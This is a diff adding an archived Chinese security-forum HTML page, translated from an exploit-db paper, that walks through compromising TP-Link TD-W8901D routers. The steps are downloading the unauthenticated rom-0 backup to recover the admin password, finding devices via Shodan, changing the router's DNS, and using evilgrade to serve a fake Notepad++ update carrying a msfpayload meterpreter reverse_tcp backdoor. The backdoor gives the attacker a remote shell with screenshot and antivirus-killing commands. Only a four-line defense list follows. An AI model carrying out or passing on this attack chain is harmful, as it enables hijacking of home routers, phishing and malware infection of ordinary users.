@@ -1,0 +1,132 @@
+<html>
+<head>
+     <title>TPLINK渗透实战 - 楚无伤</title>
+	 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+</head>
+<body>
+<h1>URL:<a href="http://drops.wooyun.org/tips/2552">http://drops.wooyun.org/tips/2552</a></h1>
+
+      <p>
+        <p><strong>from: http://www.exploit-db.com/wp-content/themes/exploit/docs/33369.pdf</strong></p>
+
+<h2>0x00 工具</h2>
+
+<hr />
+
+<p>一台笔记本电脑 TD-W8901D路由器（firmware 6.0.0） 虚拟机(WIN7)、Kali Linux（攻击机）、evilgrade（一个模块化的脚本框架，可实现伪造的升级、自带DNS和WEB服务模块，http://www.infobyte.com.ar/down/isr-evilgrade-Readme.txt) Metasploit。</p>
+
+<h2>0x01 示例</h2>
+
+<hr />
+
+<p><strong>互联网攻击示意图：</strong></p>
+
+<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/e0cdb7a2cc28fb1bbcaa4500f0a18fdf.jpg" alt="enter image description here" /></p>
+
+<!--more-->
+
+<p><strong>局域网攻击示意图</strong></p>
+
+<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/aa7efd1e943c6369921b4559b4cd522e.jpg" alt="enter image description here" /></p>
+
+<p>市场上有很多类型的路由器可用，但绝大部分从未升级固件，所以可对大多数家用路由进行这个攻击，在这个项目中使用的是最常见的TPlink路由器。</p>
+
+<p>TPLINK某些版本有一个关键的漏洞：未授权访问Firmware/Romfile界面，无需登陆密码，像这样http://IP//rpFWUpload.html。</p>
+
+<p>同时也可以下载romfile备份文件（rom-0）,像这样：http://IP address/rom-0。</p>
+
+<p>步骤一：下载rom文件 <img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/7f8ceb4271615ebb34535e9aa18edf61.jpg" alt="enter image description here" /></p>
+
+<p>下载回来的rom文件需要逆向工程得到明文密码，但有一个更简单的方法，去俄罗斯的一个网站可以解密 http://www.hakim.ws/huawei/rom-0/</p>
+
+<p>步骤二：使用账号密码登陆 <img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/39b7745ba4186dc33c81ac7009d1fd48.jpg" alt="enter image description here" /></p>
+
+<p>第三步：使用搜索引擎SHODAN 搜索RomPager，可在互联网上找到700多万个这种设备 <img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/479c2d53c954b658b8e93f95c257a9db.jpg" alt="enter image description here" /></p>
+
+<p>简单的改变一下路由器的DNS，就可以重定向用户的请求，这个方法可以用来钓鱼（从我了解的情况看来，国内已经有大批路由被利用，并已经被黑产用作钓鱼欺诈，黑产表打我，我猜的）。但这个太简单了，作者希望玩的更高(hua)深(shao)一些。</p>
+
+<p>默认DNS的配置是这样： <img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/907e707c8fea39dc230b3bfcb06abfd4.jpg" alt="enter image description here" /></p>
+
+<p>改成攻击者自己的DNS：</p>
+
+<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/e8b9caad18e3d1c1b79e7e37fa925faa.jpg" alt="enter image description here" /></p>
+
+<p>攻击系统：DNS服务器一台、kali预装了evilgrade 和metasploit。</p>
+
+<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/afedd992ab1882d3e2ac33e87c30bbae.jpg" alt="enter image description here" /></p>
+
+<p>第五步：建一个带后门的payload，给用户发送升级指令。LHOST= 攻击者机器IP和 LPORT =任何开放的端口。</p>
+
+<pre><code>Commad:@@# msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.5.132 LPORT=8080 x &gt; navebackdoor.exe 
+</code></pre>
+
+<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/1631fb741b61426aae3032ccc7f936c8.jpg" alt="2014071323521922657.jpg" /></p>
+
+<p>第六步：启动metasploit、运行payload</p>
+
+<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/c01edacb94ca243425c4eb2e7fdf830b.jpg" alt="2014071323523583152.jpg" /></p>
+
+<p>  <img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/e6030473d7153cb94f587ad7f5b4c00f.jpg" alt="2014071323530565178.jpg" /></p>
+
+<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/5a5c17cefb89e7b1aa4eb7735a9909eb.jpg" alt="2014071323531775176.jpg" /></p>
+
+<p>第七步：设置监听主机和监听端口，命令：set LHOST（攻击者的IP）、set LPORT（监听端口，创建后门时分配的）、exploit（进行攻击）</p>
+
+<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/a0c0e1bc019f4408961bef762ae03462.jpg" alt="2014071323533763041.jpg" /></p>
+
+<p>第八步：启动假的WEB升级服务器evilgrade，执行show modules后，可以看到很多假更新模块，这里选用notepadplus</p>
+
+<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/bdbec0971fd08893052c029fb2f3fa98.jpg" alt="2014071323535610035.jpg" /></p>
+
+<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/f877c63f0c7271c24634c45446b4ef53.jpg" alt="2014071323541051845.jpg" /></p>
+
+<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/fa83a27007385538b243bb0750982b96.jpg" alt="2014071323542812615.jpg" /></p>
+
+<p>第九步：show options可以看到模块的使用方法，设置后门升级文件路径使用agent：</p>
+
+<pre><code>Set  agent  ‘[“&lt;%OUT%&gt;/root/Desktop/navebackdoor.exe&lt;%OUT%&gt;”]’ 
+</code></pre>
+
+<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/3fc8dc2cd1566ea2ab2ddd0648402080.jpg" alt="2014071323544287175.jpg" /></p>
+
+<p>第十步：完成以上动作后，启动EvilGrade的WEB服务器：</p>
+
+<pre><code>start
+</code></pre>
+
+<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/36e179fc4bf4e5edb0bb531fc323c8dd.jpg" alt="2014071323550126547.jpg" /></p>
+
+<p>第十一步：等受害者打开notepadplus，一旦打开就会弹出要求更新的提示，更新过程中将会加载我们的后门程序。</p>
+
+<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/4c2dda14f5df92449cccf5b580e39524.jpg" alt="2014071323551940538.jpg" /></p>
+
+<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/ba14950b8dc3c1fec3efb89197da5aba.jpg" alt="2014071323553365266.jpg" /></p>
+
+<p>第十二步：在攻击机器上，evilgrade和Metasploit建立会话，等待返回的shell</p>
+
+<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/5a3c914bed9891fd5540422584e077d0.jpg" alt="2014071323554774816.jpg" /></p>
+
+<p>第十三步：拿到shell，使用sysinfo查看一下：</p>
+
+<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/9e09f4ab11e9560e56a36eda7e43f610.jpg" alt="2014071323560039521.jpg" /></p>
+
+<p>输入help可以看到很多命令，包括scrrenshot、killav,运行vnc 等</p>
+
+<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/9f31235f52c90eacc614f65aadd7f49c.jpg" alt="2014071323561637433.jpg" /></p>
+
+<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/d03dac4dcde760082d86ab920a6e66a7.jpg" alt="2014071323563672357.jpg" /></p>
+
+<h2>0x02 防御方法</h2>
+
+<hr />
+
+<p>经常升级你的路由器版本</p>
+
+<p>路由器不要在公网暴露</p>
+
+<p>系统和软件升级时检查证书</p>
+
+<p>设置静态IP，比如google的8.8.8.8、8.8.4.4（广告：阿里巴巴的公共dns 223.5.5.5 和 223.6.6.6）</p>      </p>
+    
+</body>
+</html>
